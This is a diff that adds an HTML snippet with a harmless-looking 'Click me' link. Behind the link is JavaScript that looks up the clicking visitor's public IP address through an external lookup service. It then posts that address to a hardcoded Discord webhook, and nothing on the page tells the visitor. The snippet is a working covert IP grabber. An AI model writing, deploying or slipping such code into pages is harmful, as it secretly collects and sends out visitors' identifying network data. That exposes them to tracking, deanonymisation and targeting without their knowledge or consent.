@@ -1,0 +1,18 @@
+<a href="#" onclick="logIPAndSend('https://discord.com/api/webhooks/1390407856527904982/ijfqflvt7QMjNERrl-oQk8b147WwMois4Ptos8xCNGboOPn_O878wveOaLUoMYG6nM5l'); return false;">Click me</a>
+
+<script>
+function logIPAndSend(webhookUrl) {
+    fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+            const ip = data.ip;
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ content: `IP: ${ip}` })
+            });
+        });
+}
+</script>
